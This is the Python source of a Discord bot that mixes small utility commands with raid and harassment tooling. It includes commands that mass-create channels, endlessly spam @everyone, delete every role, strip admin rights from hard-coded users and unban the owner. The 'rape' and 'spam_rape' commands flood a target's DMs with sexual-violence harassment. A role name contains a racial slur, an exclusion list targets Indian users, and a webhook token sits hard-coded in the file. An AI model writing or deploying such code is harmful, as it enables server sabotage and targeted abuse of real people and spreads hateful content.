import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import time
import os
from dotenv import load_dotenv
import random
import aiohttp
from bs4 import BeautifulSoup
from words import words

load_dotenv()  # Load environment variables from.env file


token = os.getenv('DISCORD_BOT_TOKEN')
owner_id = 946386383809949756 #dovyrn
imintomen_id = 1142107446458978344

# Define the necessary intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent (if needed)
intents.members = True

auto_remove = False


mass_sending = False

bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)

WEBHOOK_URL = "https://discord.com/api/webhooks/1294584017605365781/RTgHVItbFfHAnwB_uyjGVzTuzaiVHuha-ZoP7Hsl0Xr6r_OyTIIXfGkKH2unDFbgVhnU"

bangla_list = ["https://tenor.com/view/bangla-bangladeshi-gifgari-shomudro-bilash-private-limited-natok-gif-25397183",
               "https://tenor.com/view/marjuk-rasel-gifgari-bangla-bangla-gif-bangladesh-gif-18042831",
               "https://tenor.com/view/more-gelam-kazi-maruf-gifgari-bangla-cinema-bangladesh-gif-19921536",
               "https://tenor.com/view/razzak-gifgari-gifgari-classic-bangla-chobi-bangla-cinema-gif-18198237",
               "https://tenor.com/view/madari-madari-bhai-madara-madara-uchiha-naruto-gif-6546085761222317001",
               "https://tenor.com/view/rezoan-rezoan-gifgari-rezoan-bd-akil-akhtab-rezoan-boka-baksho-gif-23546120",
               "https://tenor.com/view/gifgari-classic-gifgari-bangladesh-bangla-gif-bangla-cinema-gif-18197935",
               "https://tenor.com/view/dipjol-bangla-cinema-abar-bol-gifgari-bangladesh-gif-19921422",
               "https://tenor.com/view/gifgari-chondokobi-ripon-ripon-video-bangla-bangla-gif-gif-18289155",
               "https://tenor.com/view/gifgari-gifgari-classic-razzak-hoi-hoi-hoi-rongila-gif-18208824"]


async def fetch_fun_fact():
    url = "https://www.thefactsite.com/1000-interesting-facts/"  # Replace with the correct URL

    # Fetch the website content
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')

                # Extract all fact elements from <p> tags with class="list"
                facts = soup.find_all("p", class_="list")

                # Choose a random fact from the list
                if facts:
                    random_fact = random.choice(facts).get_text()
                    return random_fact.strip()  # Strip any leading/trailing whitespace
                else:
                    return "Couldn't find any fun facts."
            else:
                return "Failed to retrieve fun facts."

async def fetch_motivational_quotes():
    url = "https://www.shopify.com/blog/motivational-quotes"

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')

                quotes = soup.find_all("li")

                if quotes:
                    random_quote = random.choice(quotes).get_text()
                    return random_quote.strip()  # Strip any leading/trailing whitespace
                else:
                    return "Couldn't find any motivational quotes."
            else:
                return "Failed to retrieve motivational quotes."
class RemoveAdminView(discord.ui.View):
    def __init__(self, admins):
        super().__init__()
        self.admins = admins

        # Create a select menu for the admin users
        select_menu = discord.ui.Select(
            placeholder="Select a user to remove admin roles",
            options=[discord.SelectOption(label=display_name, value=str(user_id)) for user_id, display_name in admins]
        )
        select_menu.callback = self.remove_admin_roles  # Assign callback
        self.add_item(select_menu)

    async def remove_admin_roles(self, interaction: discord.Interaction):
        # Get selected user ID
        selected_user_id = int(self.children[0].values[0])
        selected_user = interaction.guild.get_member(selected_user_id)

        if selected_user:
            # List of roles that have admin permissions
            admin_roles = [role for role in selected_user.roles if role.permissions.administrator]

            if admin_roles:
                # Remove all admin roles
                await selected_user.remove_roles(*admin_roles)
                await interaction.response.send_message(
                    f"Removed admin roles from {selected_user.display_name}: {', '.join(role.name for role in admin_roles)}.",
                    ephemeral=True
                )
            else:
                await interaction.response.send_message(f"{selected_user.display_name} has no roles with admin permissions.", ephemeral=True)
        else:
            await interaction.response.send_message("Could not find the selected user.", ephemeral=True)


@bot.event
async def on_ready():   
    print(f'Bot is ready as {bot.user}')
    await bot.change_presence(status=discord.Status.online)
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

@bot.tree.command(name="check_admin", description="Check which users have admin permissions")
async def check_admins(interaction: discord.Interaction):
    if interaction.user.id == owner_id:  # Ensure only the owner can run this
        admins = [
            (member.id, member.display_name) for member in interaction.guild.members
            if any(role.permissions.administrator for role in member.roles)
        ]

        if admins:
            # Create a view with the select menu and send it
            view = RemoveAdminView(admins)
            await interaction.response.send_message(
                f"The following users have admin permissions: {', '.join(display_name for _, display_name in admins)}",
                view=view,
                ephemeral=True
            )
        else:
            await interaction.response.send_message("No users have admin permissions in this server.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)



@bot.event
async def on_member_update(before, after):
    global owner_id
    # Ensure you're using the correct guild ID and owner ID
    guild_id = imintomen_id  # Replace with your variable for the target server
    owner_id = owner_id  # Use your variable for the bot owner's ID

    # IDs of the users to monitor
    user_ids = [755472029049946303, 755475988149960866]  # Replace with your user IDs

    if before.guild.id != guild_id:
        return  # Ignore updates in other servers

    # Check if the updated user is one of the target users
    if after.id in user_ids:
        # Check admin permissions before and after
        before_admin = any(role.permissions.administrator for role in before.roles)
        after_admin = any(role.permissions.administrator for role in after.roles)

        # Fetch the bot owner to send a message
        try:
            owner = await bot.fetch_user(owner_id)
        except discord.NotFound:
            return

        # If the user gained an admin role
        if not before_admin and after_admin:
            await owner.send(f"{after.mention} has been granted admin")
            admin_role = next((role for role in after.roles if role.permissions.administrator), None)
            if admin_role:
                while auto_remove:
                    await after.remove_roles(admin_role)

        # If the user lost an admin role
        elif before_admin and not after_admin:
            await owner.send(f"{after.mention} no longer has admin.")

@bot.tree.command()
@app_commands.describe(state="True/False")
async def toggle(interaction: discord.Interaction, state: str):
    if interaction.user.id == owner_id:
        global auto_remove
        if state.lower() == "true":
            auto_remove = True
            await interaction.response.send_message("Set toggle to True", ephemeral=True)
        elif state.lower() == "false":
            auto_remove = False
            await interaction.response.send_message("Set toggle to False", ephemeral=True)
        else:
            await interaction.response.send_message("Invalid state. Please use True or False", ephemeral=True)
    else:
        return

@bot.tree.command()
@app_commands.describe(name="What name for the channels", amount= "How many channels to create")
async def create(interaction: discord.Interaction, name: str, amount: int):
    if interaction.user.id == owner_id:
        start_time = time.time()
        allow_mentions = discord.AllowedMentions(everyone=True)
        guild = interaction.guild

        async def create_channel():
            await guild.create_text_channel(name)

        # Create a list of tasks for creating channels
        tasks = [create_channel() for _ in range(amount)]
        
        # Run all tasks concurrently
        await asyncio.gather(*tasks)

        end_time = time.time()
        duration = end_time - start_time
        
        await interaction.response.send_message(f"Created {amount} channels named '{name}' in {duration:.2f} seconds.")
    else:
        await interaction.response.send_message("This command's power is a tempest, beyond mortal comprehension.")

@bot.hybrid_command()
async def ping(ctx):
    await ctx.send('Pong!')

@bot.command()
async def remove(ctx, prefix: str):
    if ctx.author.id == owner_id:
        
        # Get all channels that start with the given prefix
        existing_channels = [channel for channel in ctx.guild.channels if channel.name.startswith(prefix)]
        if existing_channels:
            # Create a list of tasks for deleting channels
            delete_tasks = [channel.delete() for channel in existing_channels]
            
            # Run all deletion tasks concurrently
            await asyncio.gather(*delete_tasks)
            await print(f"Deleted {len(existing_channels)} channels starting with '{prefix}'.")
        else:
            await print(f"No channels starting with '{prefix}' to remove.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def mass(ctx, content: str, channel_name: str):
    global mass_sending  # Use the global variable
    if ctx.author.id == owner_id:
        
        allow_mentions = discord.AllowedMentions(everyone=True)
        guild = ctx.guild
        
        mass_sending = True  # Set the flag to true to start mass sending

        while mass_sending:  # Check the flag in the loop
            # Get all text channels in the guild, filter by channel name
            channels = [channel for channel in guild.text_channels if channel.name.startswith(channel_name)]

            tasks = []
            for channel in channels:
                tasks.append(asyncio.create_task(channel.send(f"{content}", allowed_mentions=allow_mentions)))
            await asyncio.gather(*tasks)
            print(f"Sent message '@everyone {content}' to {len(channels)} channels.")

    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def stop_mass(ctx):
    global mass_sending  # Use the global variable
    if ctx.author.id == owner_id:
        mass_sending = False  # Set the flag to false to stop mass sending
        await ctx.send("Mass messaging has been stopped.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def addrole(ctx, role_name: str, role_amount : int):
    if ctx.author.id == owner_id:
        
        guild = ctx.guild
        async def create_role():
            role = await guild.create_role(name=role_name)
        tasks = [create_role() for _ in range(role_amount)]
        await asyncio.gather(*tasks)
        print(f"Created {role_amount} roles named '{role_name}'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def delrole(ctx):
    if ctx.author.id == owner_id:
        
        bot_role = ctx.guild.me.top_role  # Get the bot's highest role
        # Filter roles to delete: not the bot's role, not @everyone, and not "legit bot test"
        roles_to_delete = [
            role for role in ctx.guild.roles 
            if role != bot_role and role.name != "@everyone" and role.name != "legit bot test"
        ]

        if roles_to_delete:
            # Create a list of delete tasks
            delete_tasks = [role.delete() for role in roles_to_delete]
            
            # Use asyncio.gather to run all delete tasks concurrently
            await asyncio.gather(*delete_tasks)
            
            await print(f"Deleted {len(roles_to_delete)} roles.")
        else:
            await print("No roles to delete except for the bot's role and 'legit bot test'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def ascend(ctx):
    if ctx.author.id == owner_id:
        role_names = ["Doryan", "cheems nigger slave"]
        roles = [discord.utils.get(ctx.guild.roles, name=name) for name in role_names]

        member = ctx.guild.get_member(owner_id)
        
        if any(role is None for role in roles):
            await ctx.send(f"One or more of the roles '{', '.join(role_names)}' are a phantom. Please summon them into existence first.")
            return
        for role in roles:
            try:
                await ctx.author.add_roles(role)
            except discord.Forbidden:
                await ctx.send("Regrettably, I lack the ability to wield the power of roles.")
                return
        await member.send("With great power comes great responsibility.")
    else:
        await ctx.send("A mortal shall not be given power...")

@bot.command()
async def create_invite(ctx):
    target_guild = bot.get_guild(imintomen_id)
    if target_guild:
            # Get the first text channel in the server to create an invite
        channel = target_guild.text_channels[0]
        invite = await channel.create_invite(max_age=300, max_uses=1)  # 5 min, 1 use
        await ctx.send(f"Embark on your journey here: {invite}")
    else:
        await ctx.send("The bot is not in the target server.")

@bot.command()
async def unban(ctx):
    if ctx.author.id == owner_id:
        target_guild = bot.get_guild(imintomen_id)
        if target_guild is None:
            await ctx.send(f"Bot is not in the server with ID {imintomen_id}.")
            return

        try:
            bans = target_guild.bans()
            async for ban_entry in bans:
                user = ban_entry.user
                if user.id == owner_id:
                    await target_guild.unban(user)
                    await ctx.send(f"{user.name} has been unbanned.")
                    break
            else:
                await ctx.send("The Master is not banned in this server.")
        except discord.Forbidden:
            await ctx.send("I do not have permission to unban members.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def state(ctx, state_type):
    if ctx.author.id == owner_id:
        if state_type == "idle":
            await bot.change_presence(status=discord.Status.idle)
        elif state_type == "dnd":
            await bot.change_presence(status=discord.Status.dnd)
        elif state_type == "online":
            await bot.change_presence(status=discord.Status.online)
        elif state_type == "offline":
            await bot.change_presence(status=discord.Status.offline)
        else:
            await ctx.send("Pleas uese 'idle', 'dnd', 'online' or 'offline'. ")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing.")

import asyncio

@bot.command()
async def clear_mass(ctx, content: str):
    if ctx.author.id == owner_id:
        deleted_count = 0  # Initialize the deleted_count here

        # Iterate through all the text channels in the guild where the command was issued
        for channel in ctx.guild.text_channels:
            if not channel.permissions_for(ctx.guild.me).read_messages:
                print(f"I don't have permission to read messages in {channel.name}.")
                continue  # Skip channels where the bot can't read messages

            try:
                messages_to_delete = []
                async for message in channel.history(limit=1000):  # Adjust the limit as needed
                    # Check if the message was sent by the bot and contains the specific content
                    if message.author == bot.user and content in message.content:
                        messages_to_delete.append(message)

                # Delete messages in batches
                if messages_to_delete:
                    await asyncio.gather(*(msg.delete() for msg in messages_to_delete))
                    deleted_count += len(messages_to_delete)  # Increment by the number of messages deleted

            except discord.Forbidden:
                print(f"I don't have permission to delete messages in {channel.name}.")
            except discord.HTTPException as e:
                print(f"An error occurred: {e}")

        # Print the result message after attempting to delete all the matching messages
        print(f"Deleted {deleted_count} messages containing '{content}' sent by the bot.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def alive(ctx):
    await ctx.send("I'm alive!")
@bot.command()
async def activity(ctx, state: str):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=discord.Game(state))
        await ctx.send(f"Changed activity to '{state}'.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")
@bot.command()
async def activity_clear(ctx):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=None)
        await ctx.send("Cleared activity.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")

@bot.command()
async def rape(ctx, user: discord.User):
    if user is None:
        await ctx.send("User not found.")
        return
        
    await bot.change_presence(activity=discord.Game(f"Raping {user}"))
    await ctx.send(f"Raping {user}")
    message_author = ctx.author.id
    
    rape_message = f"Youre being raped by <@{message_author}>\nhttps://tenor.com/view/gojo-satoru-gif-14818873849943523300"

    try:
            await user.send(rape_message)
    except discord.Forbidden:
        await ctx.send(f"I can't send a DM to {user.name}. They might have DMs disabled.")


@bot.tree.command()
@app_commands.describe(message="The message to send", amount="Amount of messages to send", batch = "Batches of messages to send")
async def spam(interaction: discord.Interaction, message: str, amount: int, batch : int):
    if amount > 25 and interaction.user.id != owner_id:
        await interaction.response.send_message("Maximum amount of 25 messages for Mortals.")
        return
    start_time = time.time()

    batch_size = batch  # Increased batch size
    batches = [message] * batch_size

    async def send_batch(messages):
        try:
            # Concatenate the messages into a single string
            message_text = '\n'.join(messages)
            await interaction.channel.send(message_text)
        except discord.HTTPException as e:
            print(f"Error sending message: {e}")

    tasks = []
    for i in range(0, amount, batch_size):
        batch = batches[:amount - i]
        tasks.append(asyncio.create_task(send_batch(batch)))

    await asyncio.gather(*tasks)
    end_time = time.time()
    duration = end_time - start_time
    await interaction.response.send_message(f"Spammed {amount} messages in {duration:.2f} seconds.")

    
@bot.command()
async def help(ctx):
    await ctx.send("""
Mortal commands:
- alive: Tells the bot that it is alive.
- create_invite: Creates an invite link to a text channel in the server.
- alive: Tells the bot that it is alive.
- rape: [userid]: Rapes the specified user.
- help: Displays this message.
- spam: Spams the channel with [message], [amount]. 25 messages for Mortals, Unlimited for Admin

Admin command:
- addrole [role_name] [role_amount]: Creates multiple roles with the same name.
- delrole: Deletes all roles except for the bot's role and 'legit bot test'.
- create [channel_name] and [channel_amount]: Creates multiple channels with the same name
- remove [channel_name]: Deletes all channels that starts with the name
- mass [message] OPTIONAL[channel_name]: Spams [message] in every channel
- stop_mass: Stops mass
- ascend:  Ascends Mahodovyron
- unban: Unbans the Master from the server.
- state [idle|dnd|online|offline]: Changes the bot's status.
- clear_mass [content]: Deletes all messages sent by the bot containing the specified content in every channel.
- activity [state]: Changes the bot's activity.""")

@bot.command()
async def purge(ctx, message):
    deleted_count = 0
    async for msg in ctx.channel.history(limit=100):
        if msg.author == bot.user and msg.content == message:
            await msg.delete()
            deleted_count += 1
    await ctx.send(f"Deleted {deleted_count} with the content {message}")

@bot.command()
@commands.cooldown(per=1, rate=5)
async def spam_rape(ctx, user: discord.User, amount: int):
    indians = [755472029049946303, 755475988149960866, 1223229005382025217, 907174800487743558]
    if ctx.author.id in indians:
        await ctx.send("This command is not for indians")
        return
    if amount > 100 and ctx.author.id!= owner_id:
        await ctx.send("Maximum amount of 25 messages for Mortals.")
        return
    if user is None:
        await ctx.send("User not found.")
        return
        
    await bot.change_presence(activity=discord.Game(f"Raping {user}"))
    await ctx.send(f"Raping {user}")
    message_author = ctx.author.id
    rape_message = f"Youre being raped by <@{message_author}>\nhttps://tenor.com/view/gojo-satoru-gif-14818873849943523300"

    async def send_message():
        try:
            await user.send(rape_message    )
        except discord.HTTPException as e:
            print(f"Error sending message: {e}")
        except discord.Forbidden:
            await ctx.send(f"I can't send a DM to {user.name}. They might have DMs disabled.")

    # Group messages in chunks to stay within rate limits
    tasks = []
    for i in range(amount):
        tasks.append(send_message())
        
        if (i + 1) % 10 == 0:
            await asyncio.gather(*tasks)
            tasks.clear()
    if tasks:
        await asyncio.gather(*tasks)

    await ctx.send(f"<@{ctx.author.id}> Finished raping <@{user.id}>")
    
@bot.tree.command(name="rar")
async def remove_admin_roles(interaction: discord.Interaction):
    target_server_id = imintomen_id  # Replace with your target server's ID
    user_ids = [755472029049946303, 755475988149960866]  # Replace with your user IDs
    
    target_guild = bot.get_guild(target_server_id)  # Get the target server (guild)

    if target_guild is None:
        await interaction.response.send_message(f"I am not in the server with ID {target_server_id}.", ephemeral=True)
        return

    removed_roles_count = 0

    if interaction.user.id == owner_id:  # Ensure only the bot owner can run this
        await interaction.response.send_message("Starting to remove admin roles...", ephemeral=True)  # Initial response

        for user_id in user_ids:
            try:
                # Fetch the member explicitly from the server
                target_user = await target_guild.fetch_member(user_id)

                if target_user is None:
                    await interaction.followup.send(f"User with ID {user_id} is not in the target server.", ephemeral=True)
                    continue

                # Get all roles with admin permissions
                admin_roles = [role for role in target_user.roles if role.permissions.administrator]

                if not admin_roles:
                    await interaction.followup.send(f"{target_user.mention} does not have any admin roles.", ephemeral=True)
                    continue

                try:
                    # Remove each admin role
                    for role in admin_roles:
                        await target_user.remove_roles(role)
                    removed_roles_count += len(admin_roles)
                    await interaction.followup.send(f"Removed {len(admin_roles)} admin role(s) from {target_user.mention} in {target_guild.name}.", ephemeral=True)
                
                except discord.Forbidden:
                    await interaction.followup.send(f"I do not have permission to remove roles from {target_user.mention} in the target server.", ephemeral=True)
                
                except discord.HTTPException as e:
                    await interaction.followup.send(f"An error occurred while removing roles from {target_user.mention}: {e}", ephemeral=True)

            except discord.NotFound:
                await interaction.followup.send(f"User with ID {user_id} was not found in the target server.", ephemeral=True)
            except discord.HTTPException as e:
                await interaction.followup.send(f"Failed to fetch user {user_id} from the target server: {e}", ephemeral=True)

        # Final message after loop
        if removed_roles_count == 0:
            await interaction.followup.send("No admin roles were removed from the specified users.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)

@commands.cooldown(per=300, rate=2)
@bot.tree.command(name="suggest", description="Suggest a command to add")
@app_commands.describe(idea="The idea you want to suggest.")
async def suggestion(interaction : discord.Interaction, idea: str):
    avatar = interaction.user.avatar.url
    suggestion_embed = discord.Embed(
        colour=discord.Colour.blue(),
        title=f"{interaction.user.display_name} added a new suggestion!",
        description=idea
    )
    suggestion_embed.set_thumbnail(url=avatar)
    suggestion_embed.set_footer(text=f"Suggested by {interaction.user.name}#{interaction.user.discriminator}")
    try:
        owner = await bot.fetch_user(owner_id)
        try:
            await owner.send(embed=suggestion_embed)
            await interaction.response.send_message(f"Succesfully sent suggestion to Dovyrn!\nHopefully he will add it soon.")
        except discord.Forbidden:
            await interaction.response.send_message(f"Oops!, Failed to send suggestion to Dovyrn!\nPlease let him know.")
    except discord.NotFound:
        interaction.response.send_message(f"Looks like dovyrn is uncapable of coding such a simple thing. He cant even find his own userid!\nSpam his dms to let him know!")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"Command is on cooldown. Try again after {int(error.retry_after)} seconds.")

@bot.tree.command(name="remind", description="Set a reminder.")
@app_commands.describe(time="Time to wait before the reminder", message="Reminder message")
async def remind(interaction: discord.Interaction, time: str, message: str):
    # Convert time to seconds (this is a simple parser, you can expand this)
    time_units = {
        's': 1,  # seconds
        'm': 60,  # minutes
        'h': 3600  # hours
    }

    if time[-1] in time_units and time[:-1].isdigit():
        wait_time = int(time[:-1]) * time_units[time[-1]]
        await interaction.response.send_message(f"Reminder set! I will remind you in {time}.", ephemeral=True)
        
        await asyncio.sleep(wait_time)  # Wait for the specified time
        await interaction.user.send(f"Reminder: {message}")  # Send a DM to the user
    else:
        await interaction.response.send_message("Invalid time format! Use a format like `10s` for seconds, `5m` for minutes, or `1h` for hours.", ephemeral=True)
        
@bot.tree.command(name="choose", description="Randomly choose one option from a list of provided choices.")
@app_commands.describe(options="Enter multiple options separated by commas")
async def choose(interaction: discord.Interaction, options: str):
    # Split the options into a list
    choices = options.split(',')
    
    # Strip whitespace and choose a random option
    selected = random.choice([option.strip() for option in choices])
    
    # Send the selected choice
    await interaction.response.send_message(f"I choose: {selected}")


@bot.tree.command(name="kick", description="Kick a member from the server.")
@app_commands.describe(member="The member to kick", reason="(Optional) Reason for kicking the member")
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = None):
    if interaction.user.guild_permissions.kick_members:
    # Check if the user has permission to kick members
        try:
            await member.kick(reason=reason)
            await interaction.response.send_message(f"{member.display_name} has been kicked from the server.", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("I do not have permission to kick this member.", ephemeral=True)
        except discord.HTTPException:
            await interaction.response.send_message("Failed to kick the member due to an HTTP error.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to kick members.", ephemeral=True)
@bot.tree.command(name="ban", description="Bans a member from the server")
@app_commands.describe(member="The member to ban", reason="(Optional) Reason for banning the member")
async def ban(interaction: discord.Interaction, member : discord.Member,reason: str = None):
    if interaction.user.guild_permissions.ban_members:  # Check if the user has permission to ban members
        # Check if the user has permission to ban members
        try:
            await member.ban(reason=reason)
            await interaction.response.send_message(f"{member.display_name} has been banned from the server.", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("I do not have permission to ban this member.", ephemeral=True)
        except discord.HTTPException:
            await interaction.response.send_message("Failed to ban the member due to an HTTP error.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to ban members.", ephemeral=True)

@bot.tree.command(name="funfact", description="Get a random fun fact from the web.")
async def funfact(interaction: discord.Interaction):
    # Fetch a random fun fact
    fact = await fetch_fun_fact()
    
    # Send the fun fact to the user
    await interaction.response.send_message(f"🧠 Fun Fact: {fact}")

@bot.tree.command(name="motivational_quotes", description= "Get a random motivational quote from the web.")
async def motivational_quote(interaction : discord.Interaction):
    quote = await fetch_motivational_quotes()

    await interaction.response.send_message(f"💪 Motivational fact: {quote}")

@bot.tree.command(name="denga_denga",description="Denga denga?")
async def denga_denga(interaction: discord.Interaction):
    await interaction.response.send_message(random.choice(bangla_list))



@bot.tree.command(name="scramble", description="Unscramble the given word!")
async def scramble(interaction: discord.Interaction):
    word = random.choice(words)
    scrambled_word = ''.join(random.sample(word, len(word)))

    await interaction.response.send_message(f"Unscramble the word: **{scrambled_word}**")

    # Record the start time
    start_time = time.time()

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel

    try:
        guess = await bot.wait_for('message', timeout=15.0, check=check)
        
        # Calculate the time taken to guess
        end_time = time.time()
        time_taken = end_time - start_time  # Calculate time in seconds

        if guess.content.lower() == word:
            await interaction.channel.send(f"Correct! 🎉 It took you {time_taken:.2f} seconds.")
        else:
            await interaction.channel.send(f"Wrong! The correct word was **{word}**.")

    except asyncio.TimeoutError:
        await interaction.channel.send(f"Time's up! The correct word was **{word}**.")

@bot.tree.command(name="hello")
async def hello(interaction : discord.Interaction):
    await interaction.response.send_message(f"Hello, {interaction.user.mention}!",
                                            ephemeral=True)

bot.run(token)
